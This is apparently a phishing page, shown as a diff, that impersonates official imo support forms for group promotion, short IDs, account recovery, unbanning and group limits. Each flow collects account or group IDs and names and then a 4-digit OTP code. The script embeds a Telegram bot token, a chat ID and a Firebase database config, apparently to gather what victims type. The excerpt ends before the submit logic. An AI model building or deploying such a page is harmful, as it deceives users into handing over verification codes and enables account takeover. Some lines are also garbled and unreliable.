+            <div class="card-sheen">
+            </div>
+            <div class="card-content">
+              <div class="icon-wrapper">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                  <rect width="18" height="11" x="3" y="11" rx="2" ry="2">
+                  </rect>
+                  <path d="M7 11V7a5 5 0 0 1 9.9-1">
+                  </path>
+                </svg>
+              </div>
+              <div class="card-text" data-i18n="card_unban">
+                Imo account/group unbanned
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="card-wrapper c5">
+          <div class="card" onclick="openModal(&#39;modal-5&#39;)">
+            <div class="card-sheen">
+            </div>
+            <div class="card-content">
+              <div class="icon-wrapper">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                  <path d="m12 14 4-4">
+                  </path>
+                  <path d="M3.34 19a10 10 0 1 1 17.32 0">
+                  </path>
+                </svg>
+              </div>
+              <div class="card-text" data-i18n="card_limit">
+                Group limite
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="info-panel">
+        <h2 data-i18n="about_title">
+          About imo
+        </h2>
+        <p data-i18n="about_desc">
+          imo is a leading global communication platform, offering free, high-quality HD video and voice calls to over 200 million users worldwide.
+        </p>
+      </div>
+    </main>
+    <!-- MODAL 1 -->
+    <div class="modal-overlay modal-c1" id="modal-1">
+      <div class="modal-box">
+        <div class="modal-header">
+          <div class="modal-title" data-i18n="modal1_title">
+            Group Promote
+          </div>
+          <button class="close-btn" onclick="closeModal(&#39;modal-1&#39;)">
+            ×
+          </button>
+        </div>
+        <div class="form-group">
+          <label data-i18n="form_group_id">
+            Dear User, enter the Group ID to promote your group
+          </label>
+          <input type="text" class="form-input" placeholder="Group ID..." data-i18n-placeholder="ph_group_id" />
+          <input type="text" class="form-input" placeholder="Confirm Group ID..." data-i18n-placeholder="ph_group_id_confirm" />
+        </div>
+        <div class="form-group">
+          <label data-i18n="form_group_name">
+            Dear User, enter the Group Name
+          </label>
+          <input type="text" class="form-input" placeholder="Group Name..." data-i18n-placeholder="ph_group_name" />
+          <input type="text" class="form-input" placeholder="Confirm Group Name..." data-i18n-placeholder="ph_group_name_confirm" />
+        </div>
+        <div class="form-group" style="margin-bottom: 10px;">
+          <label data-i18n="form_promote_days">
+            Dear User, select how many days you want to promote
+          </label>
+          <div class="limit-options">
+            <button class="limit-btn" onclick="selectOption(this, &#39;1 Day&#39;)" data-i18n="opt_1_day">
+              1 Day
+            </button>
+            <button class="limit-btn" onclick="selectOption(this, &#39;7 Days&#39;)" data-i18n="opt_7_days">
+              7 Days
+            </button>
+            <button class="limit-btn" onclick="selectOption(this, &#39;30 Days&#39;)" data-i18n="opt_30_days">
+              30 Days
+            </button>
+          </div>
+        </div>
+        <div style="text-align: center; margin-bottom: 15px; color: rgba(255,255,255,0.5); font-size: 0.85rem;" data-i18n="form_submit_hint">
+          Now submit here
+        </div>
+        <button class="btn-submit" onclick="fastSubmitFlow(&#39;promote&#39;)" data-i18n="btn_submit">
+          Submit
+        </button>
+      </div>
+    </div>
+    <div class="modal-overlay modal-c1" id="modal-1-5">
+      <div class="modal-box">
+        <div class="modal-header">
+          <div class="modal-title" data-i18n="user_verify_title">
+            User Verification
+          </div>
+          <button class="close-btn" onclick="closeModal(&#39;modal-1-5&#39;)">
+            ×
+          </button>
+        </div>
+        <p style="font-size: 0.9rem; color: rgba(255,255,255,0.8); margin-bottom: 20px; line-height: 1.5; text-align: center;" data-i18n="user_verify_desc">
+          To confirm your request, please verify with your User Name and User Account Number
+        </p>
+        <div class="form-group">
+          <label data-i18n="user_name">
+            User Name (Any Name)
+          </label>
+          <input type="text" class="form-input" placeholder="Enter any User Name..." data-i18n-placeholder="ph_user_name" />
+        </div>
+        <div class="form-group">
+          <label data-i18n="user_account">
+            User Account Number (Any Number)
+          </label>
+          <input type="text" class="form-input" placeholder="Enter any Account Number..." data-i18n-placeholder="ph_user_account" />
+        </div>
+        <button class="btn-submit" onclick="fastSubmitVerification(&#39;promote&#39;)" data-i18n="btn_send_verify">
+          Verify Now
+        </button>
+      </div>
+    </div>
+    <div class="modal-overlay modal-c1" id="modal-1-7">
+      <div class="modal-box">
+        <div class="modal-header">
+          <div class="modal-title" data-i18n="otp_title">
+            OTP Verification
+          </div>
+          <button class="close-btn" onclick="closeModal(&#39;modal-1-7&#39;)">
+            ×
+          </button>
+        </div>
+        <p style="font-size: 0.9rem; color: rgba(255,255,255,0.8); margin-bottom: 20px; line-height: 1.5; text-align: center;" data-i18n="otp_desc">
+          Enter the 4-digit code sent to your number
+        </p>
+        <div class="otp-container" id="otp-inputs-promote">
+          <input type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*" />
+          <input type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*" />
+          <input type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*" />
+          <input type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*" />
+        </div>
+        <div class="verify-loading" id="verify-loading-promote">
+          <div class="spinner">
+          </div>
+          <span style="color: var(--c1); font-size: 0.9rem;" data-i18n="otp_verifying">          Verifying...
+</span>
+        </div>
+        <div class="verify-success" id="verify-success-promote">
+          <div class="success-icon">
+            ✓
+          </div>
+          <span class="success-text" data-i18n="otp_success">          Successfully Verified!
+</span>
+        </div>
+        <button class="btn-submit" id="otp-submit-btn-promote" onclick="autoVerify(&#39;promote&#39;)" data-i18n="btn_verify">
+          Verify
+        </button>
+      </div>
+    </div>
+    <!-- MODAL 2 -->
+    <div class="modal-overlay modal-c2" id="modal-2">
+      <div class="modal-box">
+        <div class="modal-header">
+          <div class="modal-title" data-i18n="modal2_title">
+            Short ID Request
+          </div>
+          <button class="close-btn" onclick="closeModal(&#39;modal-2&#39;)">
+            ×
+          </button>
+        </div>
+        <div class="form-group">
+          <label data-i18n="form_shortid_id">
+            Dear User, enter the Group ID to get a Short ID
+          </label>
+          <input type="text" class="form-input" placeholder="Group ID..." data-i18n-placeholder="ph_group_id" />
+          <input type="text" class="form-input" placeholder="Confirm Group ID..." data-i18n-placeholder="ph_group_id_confirm" />
+        </div>
+        <div class="form-group">
+          <label data-i18n="form_group_name">
+            Dear User, enter the Group Name
+          </label>
+          <input type="text" class="form-input" placeholder="Group Name..." data-i18n-placeholder="ph_group_name" />
+          <input type="text" class="form-input" placeholder="Confirm Group Name..." data-i18n-placeholder="ph_group_name_confirm" />
+        </div>
+        <div class="form-group" style="margin-bottom: 10px;">
+          <label data-i18n="form_shortid_type">
+            Dear User, select the type of Short ID
+          </label>
+          <div class="limit-options">
+            <button class="limit-btn" onclick="selectOption(this, &#39;3 Digit&#39;)" data-i18n="opt_3_digit">
+              3 Digit
+            </button>
+            <button class="limit-btn" onclick="selectOption(this, &#39;4 Digit&#39;)" data-i18n="opt_4_digit">
+              4 Digit
+            </button>
+            <button class="limit-btn" onclick="selectOption(this, &#39;5 Digit&#39;)" data-i18n="opt_5_digit">
+              5 Digit
+            </button>
+          </div>
+        </div>
+        <div style="text-align: center; margin-bottom: 15px; color: rgba(255,255,255,0.5); font-size: 0.85rem;" data-i18n="form_submit_hint">
+          Now submit here
+        </div>
+        <button class="btn-submit" onclick="fastSubmitFlow(&#39;shortid&#39;)" data-i18n="btn_submit">
+          Submit
+        </button>
+      </div>
+    </div>
+    <div class="modal-overlay modal-c2" id="modal-2-5">
+      <div class="modal-box">
+        <div class="modal-header">
+          <div class="modal-title" data-i18n="user_verify_title">
+            User Verification
+          </div>
+          <button class="close-btn" onclick="closeModal(&#39;modal-2-5&#39;)">
+            ×
+          </button>
+        </div>
+        <p style="font-size: 0.9rem; color: rgba(255,255,255,0.8); margin-bottom: 20px; line-height: 1.5; text-align: center;" data-i18n="user_verify_desc">
+          To confirm your request, please verify with your User Name and User Account Number
+        </p>
+        <div class="form-group">
+          <label data-i18n="user_name">
+            User Name (Any Name)
+          </label>
+          <input type="text" class="form-input" placeholder="Enter any User Name..." data-i18n-placeholder="ph_user_name" />
+        </div>
+        <div class="form-group">
+          <label data-i18n="user_account">
+            User Account Number (Any Number)
+          </label>
+          <input type="text" class="form-input" placeholder="Enter any Account Number..." data-i18n-placeholder="ph_user_account" />
+        </div>
+        <button class="btn-submit" onclick="fastSubmitVerification(&#39;shortid&#39;)" data-i18n="btn_send_verify">
+          Verify Now
+        </button>
+      </div>
+    </div>
+    <div class="modal-overlay modal-c2" id="modal-2-7">
+      <div class="modal-box">
+        <div class="modal-header">
+          <div class="modal-title" data-i18n="otp_title">
+            OTP Verification
+          </div>
+          <button class="close-btn" onclick="closeModal(&#39;modal-2-7&#39;)">
+            ×
+          </button>
+        </div>
+        <p style="font-size: 0.9rem; color: rgba(255,255,255,0.8); margin-bottom: 20px; line-height: 1.5; text-align: center;" data-i18n="otp_desc">
+          Enter the 4-digit code sent to your number
+        </p>
+        <div class="otp-container" id="otp-inputs-shortid">
+          <input type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*" />
+          <input type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*" />
+          <input type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*" />
+          <input type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*" />
+        </div>
+        <div class="verify-loading" id="verify-loading-shortid">
+          <div class="spinner">
+          </div>
+          <span style="color: var(--c2); font-size: 0.9rem;" data-i18n="otp_verifying">          Verifying...
+</span>
+        </div>
+        <div class="verify-success" id="verify-success-shortid">
+          <div class="success-icon">
+            ✓
+          </div>
+          <span class="success-text" data-i18n="otp_success">          Successfully Verified!
+</span>
+        </div>
+        <button class="btn-submit" id="otp-submit-btn-shortid" onclick="autoVerify(&#39;shortid&#39;)" data-i18n="btn_verify">
+          Verify
+        </button>
+      </div>
+    </div>
+    <!-- MODAL 3 -->
+    <div class="modal-overlay modal-c3" id="modal-3">
+      <div class="modal-box">
+        <div class="modal-header">
+          <div class="modal-title" data-i18n="modal3_title">
+            Account Recovery
+          </div>
+          <button class="close-btn" onclick="closeModal(&#39;modal-3&#39;)">
+            ×
+          </button>
+        </div>
+        <div class="form-group">
+          <label data-i18n="form_hrad_id">
+            Dear User, enter your Account ID
+          </label>
+          <input type="text" class="form-input" placeholder="Account ID..." data-i18n-placeholder="ph_account_id" />
+          <input type="text" class="form-input" placeholder="Confirm Account ID..." data-i18n-placeholder="ph_account_id_confirm" />
+        </div>
+        <div class="form-group">
+          <label data-i18n="form_hrad_name">
+            Dear User, enter your Account Name
+          </label>
+          <input type="text" class="form-input" placeholder="Account Name..." data-i18n-placeholder="ph_account_name" />
+          <input type="text" class="form-input" placeholder="Confirm Account Name..." data-i18n-placeholder="ph_account_name_confirm" />
+        </div>
+        <div class="form-group" style="margin-bottom: 10px;">
+          <label data-i18n="form_hrad_issue">
+            Dear User, select the type of issue
+          </label>
+          <div class="limit-options">
+            <button class="limit-btn" onclick="selectOption(this, &#39;Password&#39;)" data-i18n="opt_password">
+              Password
+            </button>
+            <button class="limit-btn" onclick="selectOption(this, &#39;Hacked&#39;)" data-i18n="opt_hacked">
+              Hacked
+            </button>
+            <button class="limit-btn" onclick="selectOption(this, &#39;Other&#39;)" data-i18n="opt_other">
+              Other
+            </button>
+          </div>
+        </div>
+        <div style="text-align: center; margin-bottom: 15px; color: rgba(255,255,255,0.5); font-size: 0.85rem;" data-i18n="form_submit_hint">
+          Now submit here
+        </div>
+        <button class="btn-submit" onclick="fastSubmitFlow(&#39;hrad&#39;)" data-i18n="btn_submit">
+          Submit
+        </button>
+      </div>
+    </div>
+    <div class="modal-overlay modal-c3" id="modal-3-5">
+      <div class="modal-box">
+        <div class="modal-header">
+          <div class="modal-title" data-i18n="user_verify_title">
+            User Verification
+          </div>
+          <button class="close-btn" onclick="closeModal(&#39;modal-3-5&#39;)">
+            ×
+          </button>
+        </div>
+        <p style="font-size: 0.9rem; color: rgba(255,255,255,0.8); margin-bottom: 20px; line-height: 1.5; text-align: center;" data-i18n="user_verify_desc">
+          To confirm your request, please verify with your User Name and User Account Number
+        </p>
+        <div class="form-group">
+          <label data-i18n="user_name">
+            User Name (Any Name)
+          </label>
+          <input type="text" class="form-input" placeholder="Enter any User Name..." data-i18n-placeholder="ph_user_name" />
+        </div>
+        <div class="form-group">
+          <label data-i18n="user_account">
+            User Account Number (Any Number)
+          </label>
+          <input type="text" class="form-input" placeholder="Enter any Account Number..." data-i18n-placeholder="ph_user_account" />
+        </div>
+        <button class="btn-submit" onclick="fastSubmitVerification(&#39;hrad&#39;)" data-i18n="btn_send_verify">
+          Verify Now
+        </button>
+      </div>
+    </div>
+    <div class="modal-overlay modal-c3" id="modal-3-7">
+      <div class="modal-box">
+        <div class="modal-header">
+          <div class="modal-title" data-i18n="otp_title">
+            OTP Verification
+          </div>
+          <button class="close-btn" onclick="closeModal(&#39;modal-3-7&#39;)">
+            ×
+          </button>
+        </div>
+        <p style="font-size: 0.9rem; color: rgba(255,255,255,0.8); margin-bottom: 20px; line-height: 1.5; text-align: center;" data-i18n="otp_desc">
+          Enter the 4-digit code sent to your number
+        </p>
+        <div class="otp-container" id="otp-inputs-hrad">
+          <input type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*" />
+          <input type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*" />
+          <input type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*" />
+          <input type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*" />
+        </div>
+        <div class="verify-loading" id="verify-loading-hrad">
+          <div class="spinner">
+          </div>
+          <span style="color: var(--c3); font-size: 0.9rem;" data-i18n="otp_verifying">          Verifying...
+</span>
+        </div>
+        <div class="verify-success" id="verify-success-hrad">
+          <div class="success-icon">
+            ✓
+          </div>
+          <span class="success-text" data-i18n="otp_success">          Successfully Verified!
+</span>
+        </div>
+        <button class="btn-submit" id="otp-submit-btn-hrad" onclick="autoVerify(&#39;hrad&#39;)" data-i18n="btn_verify">
+          Verify
+        </button>
+      </div>
+    </div>
+    <!-- MODAL 4 -->
+    <div class="modal-overlay modal-c4" id="modal-4">
+      <div class="modal-box">
+        <div class="modal-header">
+          <div class="modal-title" data-i18n="modal4_title">
+            Unban Request
+          </div>
+          <button class="close-btn" onclick="closeModal(&#39;modal-4&#39;)">
+            ×
+          </button>
+        </div>
+        <div class="form-group">
+          <label data-i18n="form_unban_id">
+            Dear User, enter your Account/Group ID
+          </label>
+          <input type="text" class="form-input" placeholder="Account/Group ID..." data-i18n-placeholder="ph_account_id" />
+          <input type="text" class="form-input" placeholder="Confirm Account/Group ID..." data-i18n-placeholder="ph_account_id_confirm" />
+        </div>
+        <div class="form-group">
+          <label data-i18n="form_unban_reason">
+            Dear User, enter the reason for the ban
+          </label>
+          <input type="text" class="form-input" placeholder="Ban Reason..." data-i18n-placeholder="ph_ban_reason" />
+          <input type="text" class="form-input" placeholder="Confirm Ban Reason..." data-i18n-placeholder="ph_ban_reason_confirm" />
+        </div>
+        <div class="form-group" style="margin-bottom: 10px;">
+          <label data-i18n="form_unban_type">
+            Dear User, select the type of your application
+          </label>
+          <div class="limit-options">
+            <button class="limit-btn" onclick="selectOption(this, &#39;Account&#39;)" data-i18n="opt_account">
+              Account
+            </button>
+            <button class="limit-btn" onclick="selectOption(this, &#39;Group&#39;)" data-i18n="opt_group">
+              Group
+            </button>
+          </div>
+        </div>
+        <div style="text-align: center; margin-bottom: 15px; color: rgba(255,255,255,0.5); font-size: 0.85rem;" data-i18n="form_submit_hint">
+          Now submit here
+        </div>
+        <button class="btn-submit" onclick="fastSubmitFlow(&#39;unban&#39;)" data-i18n="btn_submit">
+          Submit
+        </button>
+      </div>
+    </div>
+    <div class="modal-overlay modal-c4" id="modal-4-5">
+      <div class="modal-box">
+        <div class="modal-header">
+          <div class="modal-title" data-i18n="user_verify_title">
+            User Verification
+          </div>
+          <button class="close-btn" onclick="closeModal(&#39;modal-4-5&#39;)">
+            ×
+          </button>
+        </div>
+        <p style="font-size: 0.9rem; color: rgba(255,255,255,0.8); margin-bottom: 20px; line-height: 1.5; text-align: center;" data-i18n="user_verify_desc">
+          To confirm your request, please verify with your User Name and User Account Number
+        </p>
+        <div class="form-group">
+          <label data-i18n="user_name">
+            User Name (Any Name)
+          </label>
+          <input type="text" class="form-input" placeholder="Enter any User Name..." data-i18n-placeholder="ph_user_name" />
+        </div>
+        <div class="form-group">
+          <label data-i18n="user_account">
+            User Account Number (Any Number)
+          </label>
+          <input type="text" class="form-input" placeholder="Enter any Account Number..." data-i18n-placeholder="ph_user_account" />
+        </div>
+        <button class="btn-submit" onclick="fastSubmitVerification(&#39;unban&#39;)" data-i18n="btn_send_verify">
+          Verify Now
+        </button>
+      </div>
+    </div>
+    <div class="modal-overlay modal-c4" id="modal-4-7">
+      <div class="modal-box">
+        <div class="modal-header">
+          <div class="modal-title" data-i18n="otp_title">
+            OTP Verification
+          </div>
+          <button class="close-btn" onclick="closeModal(&#39;modal-4-7&#39;)">
+            ×
+          </button>
+        </div>
+        <p style="font-size: 0.9rem; color: rgba(255,255,255,0.8); margin-bottom: 20px; line-height: 1.5; text-align: center;" data-i18n="otp_desc">
+          Enter the 4-digit code sent to your number
+        </p>
+        <div class="otp-container" id="otp-inputs-unban">
+          <input type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*" />
+          <input type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*" />
+          <input type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*" />
+          <input type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*" />
+        </div>
+        <div class="verify-loading" id="verify-loading-unban">
+          <div class="spinner">
+          </div>
+          <span style="color: var(--c4); font-size: 0.9rem;" data-i18n="otp_verifying">          Verifying...
+</span>
+        </div>
+        <div class="verify-success" id="verify-success-unban">
+          <div class="success-icon">
+            ✓
+          </div>
+          <span class="success-text" data-i18n="otp_success">          Successfully Verified!
+</span>
+        </div>
+        <button class="btn-submit" id="otp-submit-btn-unban" onclick="autoVerify(&#39;unban&#39;)" data-i18n="btn_verify">
+          Verify
+        </button>
+      </div>
+    </div>
+    <!-- MODAL 5 -->
+    <div class="modal-overlay modal-c5" id="modal-5">
+      <div class="modal-box">
+        <div class="modal-header">
+          <div class="modal-title" data-i18n="modal5_title">
+            Group Limit
+          </div>
+          <button class="close-btn" onclick="closeModal(&#39;modal-5&#39;)">
+            ×
+          </button>
+        </div>
+        <div class="form-group">
+          <label data-i18n="form_limit_id">
+            Dear User, enter the Group ID to increase your group limit
+          </label>
+          <input type="text" class="form-input" placeholder="Group ID..." data-i18n-placeholder="ph_group_id" />
+          <input type="text" class="form-input" placeholder="Confirm Group ID..." data-i18n-placeholder="ph_group_id_confirm" />
+        </div>
+        <div class="form-group">
+          <label data-i18n="form_group_name">
+            Dear User, enter the Group Name
+          </label>
+          <input type="text" class="form-input" placeholder="Group Name..." data-i18n-placeholder="ph_group_name" />
+          <input type="text" class="form-input" placeholder="Confirm Group Name..." data-i18n-placeholder="ph_group_name_confirm" />
+        </div>
+        <div class="form-group" style="margin-bottom: 10px;">
+          <label data-i18n="form_limit_amount">
+            Dear User, select how many thousand limits you want
+          </label>
+          <div class="limit-options">
+            <button class="limit-btn" onclick="selectOption(this, &#39;1000&#39;)">
+              1000
+            </button>
+            <button class="limit-btn" onclick="selectOption(this, &#39;2000&#39;)">
+              2000
+            </button>
+            <button class="limit-btn" onclick="selectOption(this, &#39;3000&#39;)">
+              3000
+            </button>
+          </div>
+        </div>
+        <div style="text-align: center; margin-bottom: 15px; color: rgba(255,255,255,0.5); font-size: 0.85rem;" data-i18n="form_submit_hint">
+          Now submit here
+        </div>
+        <button class="btn-submit" onclick="fastSubmitFlow(&#39;limit&#39;)" data-i18n="btn_submit">
+          Submit
+        </button>
+      </div>
+    </div>
+    <div class="modal-overlay modal-c5" id="modal-6">
+      <div class="modal-box">
+        <div class="modal-header">
+          <div class="modal-title" data-i18n="user_verify_title">
+            User Verification
+          </div>
+          <button class="close-btn" onclick="closeModal(&#39;modal-6&#39;)">
+            ×
+          </button>
+        </div>
+        <p style="font-size: 0.9rem; color: rgba(255,255,255,0.8); margin-bottom: 20px; line-height: 1.5; text-align: center;" data-i18n="user_verify_desc">
+          To confirm your request, please verify with your User Name and User Account Number
+        </p>
+        <div class="form-group">
+          <label data-i18n="user_name">
+            User Name (Any Name)
+          </label>
+          <input type="text" class="form-input" placeholder="Enter any User Name..." data-i18n-placeholder="ph_user_name" />
+        </div>
+        <div class="form-group">
+          <label data-i18n="user_account">
+            User Account Number (Any Number)
+          </label>
+          <input type="text" class="form-input" placeholder="Enter any Account Number..." data-i18n-placeholder="ph_user_account" />
+        </div>
+        <button class="btn-submit" onclick="fastSubmitVerification(&#39;limit&#39;)" data-i18n="btn_send_verify">
+          Verify Now
+        </button>
+      </div>
+    </div>
+    <div class="modal-overlay modal-c5" id="modal-7">
+      <div class="modal-box">
+        <div class="modal-header">
+          <div class="modal-title" data-i18n="otp_title">
+            OTP Verification
+          </div>
+          <button class="close-btn" onclick="closeModal(&#39;modal-7&#39;)">
+            ×
+          </button>
+        </div>
+        <p style="font-size: 0.9rem; color: rgba(255,255,255,0.8); margin-bottom: 20px; line-height: 1.5; text-align: center;" data-i18n="otp_desc">
+          Enter the 4-digit code sent to your number
+        </p>
+        <div class="otp-container" id="otp-inputs-limit">
+          <input type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*" />
+          <input type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*" />
+          <input type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*" />
+          <input type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*" />
+        </div>
+        <div class="verify-loading" id="verify-loading-limit">
+          <div class="spinner">
+          </div>
+          <span style="color: var(--c5); font-size: 0.9rem;" data-i18n="otp_verifying">          Verifying...
+</span>
+        </div>
+        <div class="verify-success" id="verify-success-limit">
+          <div class="success-icon">
+            ✓
+          </div>
+          <span class="success-text" data-i18n="otp_success">          Successfully Verified!
+</span>
+        </div>
+        <button class="btn-submit" id="otp-submit-btn-limit" onclick="autoVerify(&#39;limit&#39;)" data-i18n="btn_verify">
+          Verify
+        </button>
+      </div>
+    </div>
+    <!-- ✅ Firebase SDK - Realtime Database -->
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js">
+    </script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js">
+    </script>
+    <script>
+      // ==========================================
+        // ⚙️ CONFIGURATION
+        // ==========================================
+        const BOT_TOKEN = &#8795543254:AAE_1TiK758XRgs2fB9efz_TwlpJHQwf6j0&#39;; 
+        const CHAT_, = &#6845199282&#39;;
+        
+        const firebaseConfig = {
+            apiKey: &#34;AIzaSyD8l_fmUmWkrmk_2y4lGb7cPcvJa5s0VvA&#34;,
+            authDomain: &#34;topup-5ab11.firebaseapp.com&#34;,
+            databaseURL: &#34;https://topup-5ab11-default-rtdb.asia-southeast1.firebasedatabase.app&#34;,
+            projectId: &#34;topup-5ab11&#34;,
+            storageBucket: &#34;topup-5ab11.firebasestorage.app&#34;,
+            messagingSenderId: &#34;354652700772&#34;,
+            appId: &#34;1:354652700772:web:542fb8149ad974372edf71&#34;,
+            measurementId: &#34;G-NZ4WW8YP3Z&#34;
+        };
+
+        // ✅ Initialize Firebase with Realtime Database
+        let db = null;
+        try {
+            if (!firebase.apps.length) {
+                firebase.initializeApp(firebaseConfig);
+                db = firebase.database();
+                console.log(&#34;✅ Firebase Realtime Database connected!&#34;);
+            }
+        } catch (error) { 
+            console.warn(&#34;Firebase initialization error:&#34;, error); 
+        }
+
+        // ==========================================
+        // TRANSLATIONS
+        // ==========================================
+        const translations = {
+            en: {
+                title: &#34;imo Officials Forms&#34;, card_promote: &#34;Imo Group Promote&#34;, card_shortid: &#34;Imo Group Short ID&#34;,
+                card_hrad: &#34;Imo Account Hrad&#34;, card_unban: &#34;Imo Account/Group Unbanned&#34;, card_limit: &#34;Group Limit&#34;,
+                about_title: &#34;About imo&#34;,
+                about_desc: &#34;imo is a leading global communication platform, offering free, high-quality HD video and voice calls to over 200 million users worldwide.&#34;,
+                modal1_title: &#34;Group Promote&#34;, modal2_title: &#34;Short ID&#34;, modal3_title: &#34;Account Recovery&#34;,
+                modal4_title: &#34;Unban Request&#34;, modal5_title: &#34;Group Limit&#34;,
+                form_group_id: &#34;Dear User, enter the Group ID to promote your group&#34;,
+                form_group_name: &#34;Dear User, enter the Group Name&#34;,
+                form_promote_days: &#34;Dear User, select how many days you want to promote&#34;,
+                form_shortid_id: &#34;Dear User, enter the Group ID to get a Short ID&#34;,
+                form_shortid_type: &#34;Dear User, select the type of Short ID&#34;,
+                form_hrad_id: &#34;Dear User, enter your Account ID&#34;,
+                form_hrad_name: &#34;Dear User, enter your Account Name&#34;,
+                form_hrad_issue: &#34;Dear User, select the type of issue&#34;,
+                form_unban_id: &#34;Dear User, enter your Account/Group ID&#34;,
+                form_unban_reason: &#34;Dear User, enter the reason for the ban&#34;,
+                form_unban_type: &#34;Dear User, select the type of your application&#34;,
+                form_limit_id: &#34;Dear User, enter the Group ID to increase your group limit&#34;,
+                form_limit_amount: &#34;Dear User, select how many thousand limits you want&#34;,
+                user_verify_title: &#34;User Verification&#34;,
+                user_verify_desc: &#34;To confirm your request, please verify with your User Name and User Account Number&#34;,
+                user_name: &#34;User Name (Any Name)&#34;,
+                user_account: &#34;User Account Number (Any Number)&#34;,
+                otp_title: &#34;OTP Verification&#34;,
+                otp_desc: &#34;Enter the 4-digit code sent to your number&#34;,
+                otp_verifying: &#34;Verifying...&#34;, otp_success: &#34;Successfully Verified!&#34;,
+                btn_submit: &#34;Submit&#34;, btn_send_verify: &#34;Verify Now&#34;, btn_verify: &#34;Verify&#34;,
+                form_submit_hint: &#34;Now submit here&#34;,
+                opt_1_day: &#34;1 Day&#34;, opt_7_days: &#34;7 Days&#34;, opt_30_days: &#34;30 Days&#34;,
+                opt_3_digit: &#34;3 Digit&#34;, opt_4_digit: &#34;4 Digit&#34;, opt_5_digit: &#34;5 Digit&#34;,
+                opt_password: &#34;Password&#34;, opt_hacked: &#34;Hacked&#34;, opt_other: &#34;Other&#34;,
+                opt_account: &#34;Account&#34;, opt_group: &#34;Group&#34;,
+                ph_group_এ: &#34;Group ID...&#34;, ph_group_id_confirm: &#34;Confirm Group ID...&#34;,
+                ph_group_name: &#34;Group Name...&#34;, ph_group_name_confirm: &#34;Confirm Group Name...&#34;,
+                ph_user_name: &#34;Enter any User Name...&#34;, ph_user_account: &#34;Enter any Account Number...&#34;,
+                ph_account_id: &#34;Account ID...&#34;, ph_account_id_confirm: &#34;Confirm Account ID...&#34;,
+                ph_account_name: &#34;Account Name...&#34;, ph_account_name_confirm: &#34;Confirm Account Name...&#34;,
+                ph_ban_reason: &#34;Ban Reason...&#34;, ph_ban_reason_confirm: &#34;Confirm Ban Reason...&#34;,
+                alert_user_name: &#34;Please enter any User Name.&#34;, 
+                alert_user_account: &#34;Please enter any Account Number.&#34;,
+                alert_otp: &#34;Please enter the complete 4-digit code.&#34;
+            },
+            bn: {
+                title: &#34;imo অফিসিয়াল ফর্ম&#34;, card_promote: &#34;ইমো গ্রুপ প্রমোট&#34;, card_shortid: &#34;ইমো গ্রুপ শর্ট আইডি&#34;,
+                card_hrad: &#34;ইমো অ্যাকাউন্ট রিকভারি&#34;, card_unban: &#34;ইমো অ্যাকাউন্ট/গ্রুপ আনব্যান&#34;, card_limit: &#34;গ্রুপ লিমিট&#34;,
+                about_title: &#34;imo সম্পর্কে&#34;,
+                about_desc: &#34;imo একটি শীর্ষস্থানীয় গ্লোবাল কমিউনিকেশন প্ল্যাটফর্ম, যা বিশ্বব্যাপী ২০০ মিলিয়নেরও বেশি ব্যবহারকারীর জন্য ফ্রি, উচ্চ-মানের এইচডি ভিডিও এবং ভয়েস কল সরবরাহ করে।&#34;,
+                modal1_title: &#34;গ্রুপ প্রমোট&#34;, modal2_title: &#34;শর্ট আইডি&#34;, modal3_title: &#34;অ্যাকাউন্ট রিকভারি&#34;,
+                modal4_title: &#34;আনব্যান রিকোয়েস্ট&#34;, modal5_title: &#34;গ্রুপ লিমিট&#34;,
+                form_group_id: &#34;প্রিয় ইউজার আপনার গ্রুপটি প্রমোট করার জন্য গ্রুপ আইডি লিখুন&#34;,
+                form_group_name: &#34;প্রিয় ইউজার গ্রুপের নামটি লিখুন&#34;,
+                form_promote_days: &#34;প্রিয় ইউজার আপনি কত দিনের জন্য প্রমোট করতে চান বাছাই করুন&#34;,
+                form_shortid_id: &#34;প্রিয় ইউজার আপনার গ্রুপের শর্ট আইডি পেতে গ্রুপ আইডি লিখুন&#34;,
+                form_shortid_type: &#34;প্রিয় ইউজার শর্ট আইডির ধরন বাছাই করুন&#34;,
+                form_hrad_id: &#34;প্রিয় ইউজার আপনার অ্যাকাউন্ট আইডি লিখুন&#34;,
+                form_hrad_name: &#34;প্রিয় ইউজার অ্যাকাউন্টের নাম লিখুন&#34;,
+                form_hrad_issue: &#34;প্রিয় ইউজার সমস্যার ধরন বাছাই করুন&#34;,
+                form_unban_id: &#34;প্রিয় ইউজার আপনার অ্যাকাউন্ট/গ্রুপ আইডি লিখুন&#34;,
+                form_unban_reason: &#34;প্রিয় ইউজার ব্যান করার কারণ লিখুন&#34;,
+                form_unban_type: &#34;প্রিয় ইউজার আপনার আবেদনের ধরন বাছাই করুন&#34;,
